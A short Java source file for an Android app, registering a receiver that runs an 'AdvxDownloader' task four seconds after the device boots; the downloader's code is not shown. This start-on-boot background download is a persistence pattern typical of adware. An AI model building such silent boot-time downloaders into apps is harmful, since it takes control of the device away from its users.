package ws.hoyland.android.advx4;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;

public class BootBroadcastReceiver extends BroadcastReceiver {

	public void onReceive(Context context, Intent intent) {
		if (intent.getAction().equals("android.intent.action.BOOT_COMPLETED")) {
			Handler handler = new Handler();
			handler.postDelayed(new AdvxDownloader(context), 4000);
		}
	}
}